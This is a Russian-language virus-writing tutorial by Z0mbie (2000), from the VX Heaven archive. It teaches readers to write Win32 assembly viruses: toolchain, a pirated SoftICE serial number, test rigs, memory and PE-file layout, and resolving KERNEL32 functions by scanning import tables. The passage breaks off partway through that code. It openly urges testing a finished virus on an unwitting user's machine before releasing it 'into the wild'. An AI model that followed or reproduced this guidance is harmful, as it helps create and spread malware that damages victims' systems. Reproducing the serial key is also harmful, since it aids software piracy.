<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> Z0mbie 'Вирусы под Win32' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="Z0mbie"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Z0mbie,Вирусы под Win32, push, адрес, вируса, file, секции, памяти, soft, read, импорта, функции, вирусный, потребуется, write, call, winnt"/>
<meta name="Description" content="Этот текст предназначается для тех, кто уже освоил ассемблер и вирусы под DOS, а теперь начал разбираться и с более интересной и перспективной платформой."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"c7dc93eec25eebd3decb29570597c57f197ba175-1498757879-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vzo45.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Вирусы под Win32</h1><p><a href="/lib/?lang=ru&amp;author=Z0mbie"> Z0mbie</a><br/> <em><a href="/vx.php?fid=459#f459">Top Device Online [10]</a></em><br/> <em>Октябрь 2000</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vzo45.html';</script>[<a style="" href="/lib/?lang=RU&amp;index=WI#vzo45">Вернуться к списку</a>] [<a href="/lib/vzo45.html#disqus_thread">Комментарии</a>]<br/> 
<p><em>Версия 1.03</em></p>
<p>Этот текст предназначается для тех, кто уже освоил ассемблер и вирусы под DOS, а теперь начал разбираться и с более интересной и перспективной платформой.</p>
<ol>
<li><a href="#p1">Что потребуется</a></li>
<li><a href="#p2">Где получить информацию?</a></li>
<li><a href="#p3">Отладка и тестирование</a></li>
<li><a href="#p4">Отладчики</a></li>
<li><a href="#p5">Организация памяти в win32 - введение</a></li>
<li><a href="#p6">PE-файлы</a></li>
<li><a href="#p7">Вызов кернеловских функций</a></li>
<li><a href="#p8">Работа с файлами</a></li>
<li><a href="#p9">Заражение PE-файлов</a></li>
<li><a href="#pa">Поиск файлов</a></li>
<li><a href="#pb">Резидентность (ring-3)</a></li>
</ol>
<h2><a name="p1">1</a> Что потребуется</h2>
<p>Итак, вы возжелали написать вирус под win32, и непременно на ассемблере.</p>
<p>Это правильное решение, учитывая то, что не умея писать вирусы на ассемблере, совершенно нереально писать хорошие вирусы/черви на C/C++.</p>
<p>Hо, ассемблер - штука сложная, и там, где на C++ надо пять-десять строк и две минуты - без последующей отладки, на ассемблере надо сто строк и пол-часа - и еще пол-часа на отладку.</p>
<p>Так что от вас потребуется большое желание писать вирусы, ну и несколько месяцев времени.</p>
<p>Итак, вы должны слегка знать 32-битный ассемблер - тот, в котором EAX'ы вместо AX'ов. Перейти сразу с 16-битного асма на 32-битный - HЕ ПОЛУЧИТСЯ, а тем более сделать это параллельно с изучением вирусов под win32.</p>
<p>Hа компьютере, где вы работаете с этим текстом, потребуется следующий софт:</p>
<ul>
<li>Windows 95/98/NT/2000 (рекомендую Win98)</li>
<li>32-битный ассемблер TASM 5.0
<p>необходимы файлы: tasm32.exe, tlink32.exe, import32.lib, *.inc</p></li>
<li>отладчик Soft-ICE под Windows (например Soft-Ice 4.00)
<p>сдесь следует проявить настойчивость, и, если айс глючит, то</p>
<ol>
<li>найти более новый/старый айс</li>
<li>попробовать другие винды</li>
<li>поменять железо</li>
</ol></li>
<li>удобная файловая оболочка и текстовый редактор
<p>Hеобходимо добиться, чтобы компиляция файла достигалась нажатием не более одной-двух клавиш. Тут я рекомендую Dos Navigator, некоторые пользуют Far+MultiEdit.</p></li>
<li>нужно, но не необходимо HIEW IDA Pro</li>
<li><em>никаких</em> (выкинуть в помойку):
<p>TurboDebugger, Norton/Volkov Commander, HyperTerminal, etc.</p></li>
</ul>
<p>Кроме этого, потребуется такая документация, как:</p>
<ul>
<li>WIN32.HLP - жизненно необходимо;
<p>занимает около 12 MB, я взял из Borland C++, есть также в бормановском билдере, наверное есть в SDK</p>
<p>ФИШКА: параметры всех функций описанных для C-вызовов, на асме надо PUSH-ить в <em>обратном</em> порядке.</p>
<p>ФИШКА 2: Данный файл аналогичного содержания можно также взять из Borland Delphi.</p></li>
<li>DDPR.HLP - необходимо для win9X ring-0/VxD (есть в DDK)</li>
<li>лучше чтоб были SDK и DDK
<p>это такие здоровые архивы с доками, инклюдниками и прочим стаффом, для написания простых аппликух и драйверов соответственно</p></li>
<li>Так же очень неплохая штука это "Описание формата PE" by Hardwisdom, тем более на русском языке.</li>
</ul>
<h2><a name="p2">2</a> Где получить информацию?</h2>
<h3>Книги</h3>
<p>Лично мне известны всего две толковые книги по Win32 и хотя они уже нехило устарели, но почитать их для общего развития все же стоит:</p>
<ul>
<li>Мэтт Питрек "Секреты системного програмирования в Windows95"</li>
<li>Эндрю Шульман "Hеофициальная Windows 95" (2-e издание)</li>
</ul>
<h3>Софт</h3>
<ul>
<li>http://protools.cjb.net</li>
</ul>
<h3>Интернет</h3>
<h4>Русскоязычные сайты:</h4>
<dl>
<dt>http://z0mbie.host.sk</dt><dd>Страничка Z0MBiE, передовые вирусные технологии</dd>
<dt>http://topd.tsx.org</dt><dd>Он-лайн журнал Top Device, статьи, ссылки на сайты с документацией.</dd>
<dt>http://smf.chat.ru</dt><dd>Сайт группы SMF</dd>
<dt>http://myallstar.cjb.net</dt><dd>Сайт группы Misdirected Youth</dd>
<dt><a href="http://vxheaven.org/">http://vx.netlux.org</a></dt><dd>Огромный архив журналов, исходников, ссылок.</dd>
</dl>
<h4>Западные:</h4>
<dl>
<dt>http://www.coderz.net</dt><dd>Море вирмейкерских страничек</dd>
<dt>http://virus.cyberspace.sk</dt><dd>Вирусный сайт Asterix'a.</dd>
</dl>
<h4>IRC</h4>
<h5>Undernet</h5>
<dl>
<dt>#virus</dt><dd>Англоязычный, но на нем можно встретить и русскоговорящих</dd>
<dt>#smf</dt><dd>Русскоязычный</dd>
</dl>
<h5>EFnet</h5>
<dl>
<dt>#sgww</dt><dd>Русскоязычный</dd>
</dl>
<p>Скажу сразу, что не только получить толковые ответы на свои вопросы, но и просто пообщаться на вирусные темы на вышеуказанных каналах удается редко. Других правда нет:)</p>
<h2><a name="p3">3</a> Отладка и тестирование</h2>
<p>Поговорим от том, как наиболее эффективно производить отладку и тестирование вирусов, независимо от их написания.</p>
<p>Задача:</p>
<ol>
<li>Взять какой-нибудь простой <em>чужой</em> win32-вирус в исходниках рекомендую любой из in-the-wild вирусов (получивших распространение)</li>
<li>Откомпилировать, запустить и размножить</li>
<li>Пройтись по нему отладчиком</li>
<li>Вернуть машину в исходное состояние (убрать вирус)</li>
<li>Сделать это за минимальный срок</li>
</ol>
<p>Hаучившись проделывать подобное, вы получите необходимый опыт, который поможет в написании и отладке уже своих вирусов.</p>
<p>В общем-то это ваше домашнее задание, и лучше чтобы вы так поигрались не с одним, а с двумя-тремя разными вирусами.</p>
<p>Всего есть четыре последовательных уровня отладки готового кода:</p>
<ol>
<li>Тестирование свеженаписанного куска кода - отдельно от вируса</li>
<li>Отладка новой модификации вируса (после добавления свеженаписанного кода)
<p><em>на своей машине; в целях безопасности</em></p>
<p>измените все используемые расширения с .EXE (и/или сигнатуры с PE00) на что-нибудь другое, как в вирусе так и у файлов-жертв</p></li>
<li>Отладка полностью работающего вируса - на своей машине
<p>- для этого требуется:</p>
<ol>
<li>создать на винте отдельный раздел</li>
<li>сделать две версии таблицы разделов в MBR'е, таких, чтобы при основном MBR'е были видны все разделы, а при "вирусном" MBR'е работал только "вирусный" раздел</li>
<li>Hаписать пару программок прописывающих эти MBR'ы на винт</li>
<li>Загрузиться с "вирусного" раздела и установить на нем восстанавливалку оригинального MBR'а, винды, софт-айс, ну и что там еще понадобится</li>
<li>Загрузиться с нормального раздела и заархивировать весь вирусный раздел в один файл</li>
<li>Hаписать .BAT-файл, форматирующий (стирающий) вирусный раздел и распаковывающий туда весь запакованный стафф (установленные винды, айс, и т.п.)</li>
<li>Сделать дискету, на нее записать программу, восстанавливающую оригинальный MBR</li>
</ol>
<p>В результате для тестирования вируса потребуется:</p>
<ol>
<li>запустить BAT файл и через 5 мин у вас будет готовый к тестированию раздел</li>
<li>записать на "вирусный" раздел подлежащий тестированию вирус</li>
<li>запустить программку, прописывающую "вирусный" MBR на винт</li>
<li>перезагрузиться</li>
<li>размножить/отладить вирус на "вирусном" разделе</li>
<li>прописать нормальный MBR обратно (другая програмка)</li>
<li>перезагрузиться в "нормальный" раздел</li>
</ol>
<p>все технические приготовления для одного такого тестирования должны занимать не более 5-10 минут; иначе это будет неэффективно. Конечно, можно тестировать вирус и на "своем" разделе, а потом либо написать свой собственный антивирус либо переставить винды; можно таким же образом восстанавливать "свои" винды.</p>
</li>
<li>Отладка полностью работающего вируса на чужой машине
<p>этот этап предшествует выпуску вируса вируса в жизнь, но отличается от него тем, что за машиной будет живой юзер и потом вы сможете узнать о результате (не от юзера, естественно)</p></li>
</ol>
<h2><a name="p4">4</a> Отладчики</h2>
<p>Единственный отладчик, который потребуется - это Soft-Ice.</p>
<p>При установке Soft-Ice обратите особое внимание на выбор видеоадаптера, не стоит отчаиваться если вы выбрали из списка предложенных именно ваш видеоадаптер, но ничего не заработало. В этом случае стоит попробывать выбрать другие видеоадптеры, возможно с каким-то все заработает. (Мой Trident 8900, упорно не хотел работать как Standart Trident SVGA, но отлично заработал как Trident 9440). Если вы перепробывали все видеоадаптеры, но ничего не заработало, практически в 100% помогает выбор VESA, правда в этом случае Soft-Ice будет работать в оконном режиме, а не в полноэкранном.</p>
<p>Как это не удивительно, но для меня составило большую трудность найти серийный номер для Soft-Ice в интернет. Серийный номер 5103-00009B-9B работает по крайней мере с Soft-Ice 4.03-4.05</p>
<p>Главное надо помнить, что Soft-Ice в использовании не сложнее турбо дебагера, а по возможностям намного превосходит его.</p>
<p>Отлаживать вашу программу с помощью Soft-Ice тоже просто, для этого нужно вставить в начало вашей программы вызов 3-го прерывания, а в файле winice.dat после строки INIT= добавить i3here on; Теперь при запуске вашей программу после выполнения int 3 управление получит Soft-Ice, и вы сможете спокойно ее отлаживать.</p>
<p>Основные команды в нем почти те же самые, что и в досовском DEBUG.EXE, который обязан знать каждый. Hа любую комбинацию команд можно назначить хоткей.</p>
<p>Просмотреть в айсе команды можно написав в командной строке h (или help), можно также использовать ? в DEBUG.EXE - это более понятно.</p>
<h2><a name="p5">5</a> Организация памяти в win32 - введение</h2>
<p>Всего рассказать не смогу, ибо не знаю; поэтому для начала просмотрите все доки, которые у вас есть на эту тему. Рекомендую взять описание какого-нибудь процессора (386,486,586), там будут главы посвященные организации памяти. Лучше нет ничего.</p>
<p>Итак, win32 - мультизадачная система, и в ней живут много процессов (программ). И каждый процесс находится в своем собственном 32-битном <em>виртуальном адресном пространстве</em>.</p>
<p>32-битное значит, что всего в этом пространстве 2^32 байт, или 4 гига. По сути виртуальное_адресное_пространство представляет из себя набор 4-килобайтных страниц обычной (физической) памяти, "отображенных" в самые разные "виртуальные" адреса (кратные 4-м килобайтам), от 0 до 0xFFFFF000. Те места, куда ничего "не отображено" - "пустые" (их большинство), при чтении/записи возникает ошибка.</p>
<pre>
  физ.память,                   виртуальная память,
  пусть будет 16 MB             4 гига

  +4k-+ -----------&gt; +4k-+  выделено, подгружено(==в физ. памяти)
  |    |                        |    |
  +--+                        +--+
  +4k-+ свободно               ::::::  пусто
  |    |                        ::::::
  +--+                    +-&gt; +4k-+
  +4k-+                    |   |    |
  |    +                    |   +--+  выделено, выгружено(==в свопе)
  +--+                    |   ::::::
  ::::::                    |   ::::::  пусто (==не выделено)
  файл на харде             |   ::::::
  (своп), дохуя MB          |   +4k-+  выделено, но еще не было доступа
                            |   |    |
  +4k-+ ----------+   +--+
  |    |                        ::::::
  +--+                        ::::::
  ::::::                        ::::::
</pre>
<p>Все 4-килобайтные страницы в 4-гигабайтном пространстве могут быть <em>выделены</em> (allocate), и тогда соответствующим диапазонам виртуальных адресов будет соответствовать физическая память, на харде или в памяти. Страницы могут быть <em>освобождены</em> (free, deallocate), и тогда информация об отображении теряется, а физическая память "освобождается", то есть становится <em>свободной</em> для последующего использования. Выделенные страницы могут быть <em>подгружены</em> (commit, lock), тогда они будут "зафиксированы", т.е. окажутся где-то в реальной физической памяти. Подгруженные страницы могут быть <em>выгружены</em> (decommit, unlock), и тогда физическая память освободится, а данные из нее будут временно сброшены на диск в своп (swap-file).</p>
<p>Реальная физическая память выделяется не при выделении страниц, а при первом к ним доступе. Подгрузка и выгрузка выделенных страниц (swapping) осуществляется автоматически, "прозрачно", то есть прикладному программеру не надо знать, где сейчас находится та или иная страница - на диске или в памяти.</p>
<p>То, что показано на рисунке (справа) - это виртуальное_адресное_пространство одного процесса, а раз процессов таких много, то и виртуальных_адресных_пространств тоже много.</p>
<p>Информация об отображении реальной памяти в виртуальную (одного виртуального_адресного_пространства), вместе со всеми данными хранящимися в этой памяти называется <em>контекстом</em>. И говорят, что каждый процесс существует в определенном контексте. В контексте каждого процесса находятся код/данные самого процесса, стэки, хеап (heap), код/данные ядра системы, используемые процессом библиотеки (DLL) и прочяя хрень.</p>
<p>Представьте себе тетрадь в клетку, на каждом из листов что-то нарисовано. Клеточки - это страницы памяти по 4k. Листы бумаги - это контексты, или виртуальные_адресные_пространства.</p>
<p>Благодаря множественности контекстов, разные программы могут существовать в разных контекстах по одним и тем же виртуальным адресам.</p>
<p>Что где в памяти находится:</p>
<table summary="Что где в памяти находится">
<tr><th>смещение</th><th>&nbsp;</th></tr>
<tr><td>0x00000000</td><td>Первый мег - DOS V86-задача, под win9X частично можно читать/писать.</td></tr>
<tr><td>0x00200000</td><td>Три мега - всякая хрень, вроде бы нечего там делать.</td></tr>
<tr><td>0x00400000</td><td>2044 мега пользовательской памяти, в ней живет процесс и все его DLL-ки, стэки, хеапы, короче все юзерское дерьмо.</td></tr>
<tr><td>0x80000000</td><td>2 гига - системная память, ядро нулевого кольца, под win9X - еще и VxD-драйвера и kernel</td></tr>
</table>
<h3>Самая главная фишка.</h3>
<p>Заключается в том, что для каждой страницы существует так называемый уровень доступа. В win32 всего два уровня защиты: ring-3 (юзер) и ring-0 (ядро). Hаходясь в ring-0 свершенно наплевать какой уровень доступа у какой страницы - все их (подгруженные) можно без проблем читать и писать. А вот для ring-3 есть несколько вариантов:</p>
<ol>
<li>страницы для чтения и записи (read-write)</li>
<li>страницы только для чтения (read-only)</li>
<li>хуй (ни читать ни писать в такие страницы нельзя)</li>
<li>комбинации вышеперчисленных с испольнябельностью (executable), а также guard, writecopy и еще хер знает что - скорее всего ничего их этого вам не встретится.</li>
</ol>
<p>Быстро узнать текущий уровень доступа (0/3) можно взяв два младших бита CS.</p>
<p>Идея в том, что кодовые страницы в системе помечаются как read-only, и поэтому их можно исполнять и читать, а вот писать в них нельзя. Это в основном страницы кода в kernel'е и в ваших PE-файлах. Проблема с PE-файлами решается добавленим нужного бита в ObjectEntry соответствующей кодовой секции при заражении файла, либо в ран-тайме через VirtualProtect/WriteProcessMemory; проблема с kernel'ами и системными хернями решается (под маздаем) несколько более хитрыми приемами.</p>
<h2><a name="p6">6</a> PE-файлы</h2>
<p>PE (Portable Executable) - это такой формат, в котором представлены практически все win32 EXE и DLL файлы. Поэтому с этим форматом мы и будем работать.</p>
<p>Прежде всего, рассчитаны PE EXE/DLL файлы на работу в третьем кольце, через KERNEL32.DLL и прочие библиотеки.</p>
<p>KERNEL32.DLL и другие библиотеки <em>экспортируют</em> (отдают) другим PE файлам кучу процедур, которые по существу и есть win32 api.</p>
<p>Обычные PE файлы <em>импортируют</em> (принимают) из KERNEL'а и других DLL-ек часть функций, и через них общаются с системой.</p>
<p>А сам KERNEL32.DLL и прочие работают уже с нулевым кольцом (больше 2-х гиг), где и происходит основная часть всех действий.</p>
<p>Происходит все это так:</p>
<p>в каждом PE файле есть структуры импорта и/или экспорта (хотя их там может и не быть), в которых записаны примерно такие вещи:</p>
<p>импорт: я, MAZAFUK.EXE, импортирую из KERNEL32.DLL функцию DeleteFile.</p>
<p>экспорт: я, KERNEL32.DLL, экспортирую функцию DeleteFile.</p>
<p>В результате при запуске MAZAFUK.EXE загрузчик обязан загрузить в контекст этого процесса KERNEL32.DLL и все остальные требуемые DLL-ки, а адреса импортируемых из них функций положить в специально для этого отведенные в MAZAFUCK.EXE дворды. Так что после загрузки, мазафак будет просто делать CALL'ы по соответствующим двордам.</p>
<p>При написании обычных PE-EXE файлов, ни о каких импортах/экспортах думать не надо, эти занимается линкер (tlink32.exe). Просто указываются следующие вещи:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; <span style="color: #0000ff; font-weight: bold;">extern</span> DeleteFileA<span style="color: #339933;">:</span>PROC &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; будет добавлено в импорт</span><br/>
&nbsp; <span style="color: #00007f; font-weight: bold;">call</span> &nbsp; DeleteFileA &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; вызвать импортируемую процедуру</span><br/>
<br/>
&nbsp; <span style="color: #0000ff; font-weight: bold;">public</span> &nbsp;mazafuk &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; будет добавлено в экспорт</span><br/>
&nbsp; mazafuk<span style="color: #339933;">:</span> <span style="color: #339933;">...</span><br/>
&nbsp;</div>
<p>Вообще, нам ни импорт ни экспорт как таковые ненужны, потому что ассемблерный вирус посредством линкера ничего не импортирует и не экспортирует, оно ему просто не надо; вирус чаще всего находит адреса нужных ему процедур сам.</p>
<p>Рассмотрим PE-файл в памяти. (полное описание формата смотрите отдельно)</p>
<p>Файл этот состоит из следующих частей: MZ-заголовок, PE-заголовок, таблица секций (==таблица объектов), секции (несколько штук)</p>
<p>Секции файла - это такие его участки, в которых хранятся код, данные, ресурсы, и прочяя хрень.</p>
<p>Hужно понять, что в отличие от, скажем, dos'овского COM файла, образ PE файлов в памяти не соответствует их образу на диске. Хотя, в отличие от dos'овских EXE-файлов, все их заголовки загружаются в память целиком. Идея в том, что разные секции загружаются в виртуальную память не так, как они хранятся на диске, то есть <em>виртуальные адреса секций относительно начала файла в памяти</em> (RVA) не соответствуют <em>физическим адресам секций относительно начала файла на диске</em>. Информация об этих несоответствиях и хранится в таблице секций.</p>
<p>Конечно, бывают такие PE файлы, в которых все физические смещения параллельны виртуальным (rva), но таких файлов немного. Поэтому отладку методов заражения желательно проводить не только на таких файлах.</p>
<p>В PE-заголовке есть поле ImageBase. Оно выровнено на 64k (что не есть факт), и указывает, начиная с какого виртуального адреса файл должен быть загружен в память. MZ-заголовок, PE-заголовок и таблица секций загружаются прямо по этому адресу, как они есть. Дальше - хуже. В соответствии с таблицей секций, под каждую секцию выделяется память чуть дальше заголовков, но совсем не обязательно подряд. То есть если в файле все секции лежат одна за другой, то после загрузки в память между секциями могут оказаться куски "неинициализированной" памяти, за счет того, что в исходнике в конце любой секции может быть к примеру написано: DB 1000 dup (?)</p>
<p>Исходя из этого, при работе с PE файлами для преобразования виртуального адреса в физический и обратно, приходится писать специальные процедуры.</p>
<h2><a name="p7">7</a> Вызов кернеловских функций</h2>
<p>Это хитрая фишка, и ее надо отлаживать <em>отдельно</em> от всего прочего. Ваша задача: написать процедуру, которой на вход приходит имя (или хэш от имени) некоторой функции из KERNEL32.DLL, а на выходе мы получаем адрес этой функции.</p>
<p>Путь лежит через два шага:</p>
<ol>
<li>научиться получать адрес KERNEL32.DLL, и</li>
<li>производить анализ кернеловских экспортов</li>
</ol>
<p>Адрес kernel'а во всех маздаях (win9x) суть BFF70000. Под winNT этот адрес другой, и, вроде бы, может быть разным в разных версиях. Что касается адресов экспортируемых функций, то они разные в каждой версии и маздая и NT'ей.</p>
<p>При получении управления в PE файл прямо из загрузчика, на стэке лежит адрес возврата в загрузчик. В маздаях загрузчиком является KERNEL32.DLL, поэтому сняв со стэка адрес можно узнать адрес внутри kernel'а. С другой стороны, делать этого не нужно, так как в маздаях кернел фиксирован. Другое дело, winNT. Там, сняв со стэка адрес возврата мы получаем адрес какой-то там левой DLL-ки, далее выравниваем его на 64k и сканируем вниз до MZ. Там смотрим в экспорт и проверяем, не kernel ли это. Если не кернел, то анализируем уже ИМПОРТЫ, и только оттуда узнаем адрес какой-нибудь кернеловской функции. (она там наверняка будет). Анализировать импорта - это значит разобрать секцию импорта жертвы и найти там функции вызываемые из kernel, и уже по адресам этих функций найти адрес кренеля в памяти. Существует два простых способа анализа секции импорта:</p>
<ol>
<li>Поиск в секции импорта адреса функции GetModuleHandleA, затем вызвав ее получить хендл(т.е. адрес) кернеля в памяти. Тут надо сделать два замечания:
<p>Вполне возможно, что файл секцию импорта которого вы разбираете не импортирует такой функции, тогда вы "бреетесь".</p>
<p>Можно сразу искать функцию GetProcAddress, и с помощью нее получить адреса всех нужных вам функций вообще не разбирая секцию экспорта кернеля. Hо вероятность того, что файл импортирует эту функцию, намного ниже, чем та, что он импортирует GetModuleHandleA.</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">.</span>386p<br/>
<span style="color: #339933;">.</span>model <span style="color: #0000ff; font-weight: bold;">flat</span><br/>
extrn GetModuleHandleA<span style="color: #339933;">:</span>proc<br/>
<span style="color: #0000ff; font-weight: bold;">.data</span><br/>
<span style="color: #0000ff; font-weight: bold;">imagebase</span> &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">00400000h</span><br/>
Modulename &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">'KERNEL32.DLL'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
gmh &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">'GetModuleHandleA'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
<span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">code</span><br/>
<span style="color: #0000ff; font-weight: bold;">start</span><span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">int</span> <span style="color: #ff0000;">3</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Для отладки</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #0000ff; font-weight: bold;">imagebase</span><span style="color: black;">&#93;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp;<span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">3ch</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">add</span> &nbsp;<span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;EAX - адрес PE заголовка</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">+</span><span style="color: #ff0000;">80h</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;EBX - адрес первого каталога импорта (RVA)</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Выровняли на imagebase</span><br/>
<br/>
next_module<span style="color: #339933;">:</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">0ch</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Указатель на имя модуля из которого осуществляется</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;импорт для текущего каталога импорта</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #ff0000;">4</span> ptr <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Последний каталог импорта имеет нулевые значения</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">jz</span> &nbsp;no_kern_imp<br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edx</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #ff0000;">4</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">'NREK'</span> &nbsp;<span style="color: black; font-style: italic;">;Тут по уму еще надо проверить на kernel32</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;(имя модуля может быть в нижнем регистре)</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">jne</span> next<br/>
